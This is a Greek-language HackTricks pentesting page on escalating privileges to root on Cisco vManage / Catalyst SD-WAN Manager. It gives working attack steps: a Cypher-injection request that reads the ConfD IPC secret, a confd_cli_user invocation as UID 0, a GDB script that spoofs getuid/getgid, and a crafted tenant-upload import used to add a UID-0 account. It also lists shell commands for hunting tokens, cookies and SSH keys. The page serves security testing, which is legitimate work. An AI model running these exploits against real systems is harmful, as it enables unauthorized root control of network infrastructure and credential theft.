# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Μόλις αποκτήσεις code execution στο Cisco vManage / *Catalyst SD-WAN Manager* ως `vmanage`, `netadmin` ή `vmanage-admin`, οι πιο ενδιαφέρουσες επιφάνειες για local privesc είναι συνήθως το stack CLI του `confd`, το helper `cmdptywrapper`, τα REST APIs στο localhost και οι handlers εισαγωγής/upload που ανήκουν στον root.

Αν χρειάζεσαι ακόμη το **initial foothold** σε έναν controller, έλεγξε πρώτα τη dedicated σελίδα για το control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Γρήγορο local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αν το `/etc/confd/confd_ipc_secret` είναι αναγνώσιμο από το foothold σας, τα Path 1 και Path 2 γίνονται άμεσα πρακτικά. Αν αποκτήσετε πρόσβαση μέσω remote file disclosure ή webshell, ελέγξτε επίσης το υλικό SSH του `vmanage-admin` και τους multitenancy upload handlers· πρόσφατη έρευνα απέδειξε ότι και τα δύο αποτελούν βιώσιμα pivots.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Η αξιολόγηση του vManage από τη Synacktiv τεκμηριώνει αυτό το μονοπάτι προς root-shell.<sup>[[5]](#references)</sup>

Η [τεκμηρίωση του ConfD](http://66.218.245.39/doc/html/rn03re18.html) που συνδέεται στην αναφορά περιγράφει το IPC authentication· το παράδειγμα vManage τοποθετεί το secret στο `/etc/confd/confd_ipc_secret` και δείχνει ότι είναι αναγνώσιμο από τον `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Επειδή το Neo4j εκτελείται με δικαιώματα `vmanage` στη συγκεκριμένη εγκατάσταση, το προηγούμενο Cypher injection μπορεί να διαβάσει το μυστικό αρχείο.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Το ίδιο το `confd_cli` δεν δέχεται ορίσματα γραμμής εντολών· καλεί το `/usr/bin/confd_cli_user`. Η αναφερόμενη ροή εργασίας εξάγει αυτό το βοηθητικό πρόγραμμα, το οποίο είναι αναγνώσιμο από τον root, από το rootfs, το αντιγράφει μέσω `scp`, διαβάζει τη βοήθειά του, ορίζει το `CONFD_IPC_ACCESS_FILE` και το καλεί με `-U 0 -G 0` για να αποκτήσει ένα root shell.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Διαδρομή 2

Αυτή η εναλλακτική διαδρομή προσαρμόστηκε από την έρευνα της Walmart Global Tech για το vManage 19.2.2.<sup>[[6]](#references)</sup>

Η διαδρομή της Synacktiv χρειάζεται ένα αντίγραφο του `/usr/bin/confd_cli_user`, το οποίο είναι αναγνώσιμο από τον root στην αναφερόμενη ρύθμιση· αντίθετα, η αναφορά της Walmart τροποποιεί τις τιμές ταυτότητας του `confd_cli` μέσα από το GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Η αποσυναρμολόγηση της αναφοράς δείχνει ότι το `confd_cli` συλλέγει το UID και το GID του καλούντος.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump που δείχνει τη συλλογή UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Η ίδια δοκιμή έδειξε ένα `cmdptywrapper` ιδιοκτησίας root που λάμβανε ρητές τιμές `-g` και `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ο ερευνητής συμπέρανε ότι το `confd_cli` προωθεί το UID και το GID του συνδεδεμένου χρήστη στο `cmdptywrapper`.<sup>[[6]](#references)</sup>

Η απευθείας εκτέλεση του `cmdptywrapper` με `-g 0 -u 0` απέτυχε, επειδή το απαιτούμενο file descriptor (`-i 1015` στο παράδειγμα) δεν ήταν διαθέσιμο.<sup>[[6]](#references)</sup>

Επειδή το `confd_cli` δεν εκθέτει αυτές τις τιμές ως arguments, η αναφορά χρησιμοποιεί το GDB για να παρακάμψει τις τιμές επιστροφής των `getuid()` και `getgid()`· το GDB ήταν διαθέσιμο στη συγκεκριμένη appliance.<sup>[[5]](#references)[[6]](#references)</sup>

Με πρόσβαση στο `vmanage`, το test μπορούσε να διαβάσει το `/etc/confd/confd_ipc_secret`· το ακόλουθο script αναγκάζει και τις δύο identity calls να επιστρέφουν μηδέν.<sup>[[6]](#references)</sup>

Το GDB script που χρησιμοποιήθηκε στην αναφορά είναι:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Η αναφερόμενη έξοδος της κονσόλας είναι:<sup>[[6]](#references)</sup>

<details>
<summary>Έξοδος κονσόλας</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Η Cisco τεκμηρίωσε αργότερα μια πιο καθαρή τοπική διαδρομή για root στη δική της advisory για το [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). Ένας **authenticated attacker με μόνο read-only privileges** μπορούσε να στείλει ένα ειδικά διαμορφωμένο αίτημα στο manager CLI και να αποκτήσει root λόγω ανεπαρκούς input validation.<sup>[[7]](#references)</sup>

Από offensive σκοπιά, αυτή η advisory και η προηγούμενη έρευνα στο CLI υποδεικνύουν το ακόλουθο workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Μόλις αποκτήσετε *οποιοδήποτε* low-priv foothold στο box, θα πρέπει να ελέγξετε το local CLI service πριν επιχειρήσετε το πιο βαρύ workflow των Path 1 / Path 2.
2. Επαναχρησιμοποιήστε τα artifacts από το Path 2 για να εντοπίσετε το trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Αντιμετωπίστε κάθε field που προωθείται στο CLI backend ως ύποπτο: UID/GID, username, terminal metadata, imported files ή οποιαδήποτε τιμή καταναλώνεται αργότερα από έναν root-owned helper.
4. Αν ένας low-priv user μπορεί να αποκτήσει πρόσβαση στο local CLI socket και να επηρεάσει αυτά τα fields, το root μπορεί να απέχει μόνο ένα crafted request.

Αφού αποκτήσετε πρόσβαση στο appliance, ελέγξτε την local CLI chain ως εξής.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Αυτό μετατρέπει το bug του 2025 σε ένα επαναχρησιμοποιήσιμο hunting pattern: αναζητήστε **local CLI shims που συλλέγουν identity σε userland και τη διαβιβάζουν σε έναν privileged wrapper**.<sup>[[6]](#references)[[7]](#references)</sup>

Μην συγχέετε το **CVE-2025-20122** με το μεταγενέστερο **CVE-2026-20122**: το ζήτημα του 2025 είναι ένα *local* CLI-to-root bug, ενώ το ζήτημα του 2026 είναι ένα *remote* API arbitrary file overwrite, το οποίο είναι κυρίως χρήσιμο για τη δημιουργία foothold και, στη συνέχεια, για την επανεξέταση των Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Η advisory της Cisco του Φεβρουαρίου 2026 περιγράφει μια ακόμη χρήσιμη κατηγορία privesc, το [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Ένας **authenticated, local attacker με low privileges** θα μπορούσε να αποκτήσει root λόγω ενός ανεπαρκούς user-authentication mechanism στο REST API.<sup>[[1]](#references)</sup>

Αυτό έχει σημασία επειδή το vManage privesc δεν περιορίζεται πλέον σε abuse των `confd`/TTY· μετά την απόκτηση low-priv shell, αναζητήστε επίσης τα ακόλουθα.<sup>[[1]](#references)</sup>

- endpoints του API που είναι διαθέσιμα μόνο στο localhost και εμπιστεύονται υπερβολικά τον caller
- tokens, cookies ή service credentials που είναι αναγνώσιμα από το τρέχον account
- root-only actions που εκτίθενται μέσω handlers των `dataservice`/REST και μπορούν ακόμη να ενεργοποιηθούν τοπικά

Στην πράξη, μόλις αποκτήσετε shell ως `vmanage` ή ως κάποιον άλλο service user, το local API abuse μπορεί να αυτοματοποιηθεί ευκολότερα από το interactive CLI abuse.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Αν το context της local session αρκεί για πρόσβαση σε privileged REST functionality, προτίμησε το API path: είναι ευκολότερο να γίνει replay, να γίνει script και να συνδυαστεί με stolen web sessions ή API tokens.<sup>[[1]](#references)</sup>

## Διαδρομή 5 (αρχείο του 2026 ειδικά διαμορφωμένο και επεξεργασμένο από το root - CVE-2026-20245)

Ένα άλλο πρόσφατο pattern είναι το [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Ένας local attacker με `netadmin` privileges μπορούσε να ανεβάσει ένα **ειδικά διαμορφωμένο αρχείο**, το οποίο στη συνέχεια χειριζόταν με μη ασφαλή τρόπο το CLI, οδηγώντας σε command injection ως `root`.<sup>[[2]](#references)</sup>

Από την οπτική του HackTricks, η πολύτιμη technique είναι ευρύτερη από το συγκεκριμένο CVE.<sup>[[2]](#references)</sup>

1. Κάνε enumerate κάθε CLI ή web workflow που δέχεται ένα αρχείο: imports, diagnostic bundles, templates, validators, backups, tenant data κ.λπ.
2. Εντόπισε πού καταλήγει το uploaded αρχείο και ποιο root-owned script ή binary το καταναλώνει.
3. Έλεγξε αν το filename, το file content ή τα parsed metadata περνούν ποτέ σε shell commands, wrapper scripts ή helpers τύπου `system()`.
4. Αν μπορείς ήδη να αποκτήσεις πρόσβαση σε `netadmin` (valid creds, stolen session ή auth-bypass chain), τα file-processing bugs είναι συχνά ο ταχύτερος δρόμος προς το root.

Η Google Cloud / Mandiant έδειξε αργότερα ένα συγκεκριμένο instance αυτής της κατηγορίας bug, το οποίο γινόταν exploit μέσω του multitenancy import path.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Στην παρατηρηθείσα επίθεση, το ειδικά διαμορφωμένο CSV τροποποίησε τα `/etc/passwd` και `/etc/shadow` για να δημιουργήσει έναν προσωρινό λογαριασμό με UID 0 (`troot`). Αυτό καθιστά τους importers τύπου `tenant-upload` / `tenant-list` ιδιαίτερα ενδιαφέροντες: δεν είναι απλώς λειτουργίες ingestion δεδομένων, αλλά πιθανά front-ends parser με δικαιώματα root.<sup>[[4]](#references)</sup>

Ένα γρήγορο hunting pattern από την πλευρά του shell είναι:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αυτή η κατηγορία bug συνδυάζεται ιδιαίτερα καλά με remote footholds που παρέχουν `netadmin`, αλλά όχι `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Άλλες πρόσφατες ευπάθειες vManage/Catalyst SD-WAN Manager για chaining

- **Unauthenticated info leak (CVE-2026-20133)** – Ιδιαίτερα υψηλής αξίας, επειδή δημόσια έρευνα έδειξε ότι θα μπορούσε να αποκαλύψει το `confd_ipc_secret` ή το private key του `vmanage-admin`, μετατρέποντας ένα read bug είτε σε Path 1 είτε σε NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Διαφορετικό από το CLI bug του 2025 παραπάνω· η VulnCheck το χρησιμοποίησε για να ανεβάσει ένα webshell, γεγονός που καθιστά άμεσα σχετικές τις local privesc paths αυτής της σελίδας.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Ένας authenticated attacker μπορεί να εκτελέσει script στο web interface ενός affected user· αξιολογήστε αν το resulting session context εκθέτει API/CLI actions που φτάνουν στο `vshell` ή σε μία από τις παραπάνω local privesc paths.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Πολύ ισχυρός precursor για το Path 5, επειδή το `netadmin` είναι ακριβώς το επίπεδο που απαιτείται από το crafted-file privesc του 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Παρόμοια offensive αξία με το CVE-2026-20122, αλλά μέσω ενός μεταγενέστερου web UI upload path· η Cisco αναφέρει ότι ένα file που δημιουργήθηκε ή αντικαταστάθηκε από το bug θα μπορούσε αργότερα να χρησιμοποιηθεί για privilege escalation σε root.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Οι intrusions του 2026 έδειξαν ότι οι attackers μπορούν να κάνουν rollback σε ένα παλαιότερο vulnerable SD-WAN build, να εκμεταλλευτούν το παλιό CLI root bug και στη συνέχεια να επαναφέρουν την αρχική έκδοση.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Τεκμηριώνεται καλύτερα στη dedicated SD-WAN control-plane σελίδα· μπορεί να προσθέσει ένα SSH key για το `vmanage-admin`, παρέχοντας persistent NETCONF access για follow-on management-plane actions.<sup>[[11]](#references)</sup>



## References

- [1] [Ευπάθειες Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129 κ.λπ.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Authenticated Privilege Escalation Vulnerability σε Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager και Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Πρόσφατες ευπάθειες Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Εκμετάλλευση zero-day ευπάθειας (CVE-2026-20245) στο Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Μέρος 1: Επίθεση στο vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking του Cisco SD-WAN vManage 19.2.2 — Από CSRF σε Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Privilege Escalation Vulnerability στο Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Ενεργή εκμετάλλευση του Cisco Catalyst SD-WAN από την UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cross-Site Scripting Vulnerability στο Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Arbitrary File Write Vulnerability στο Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Κρίσιμο authentication bypass στο Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
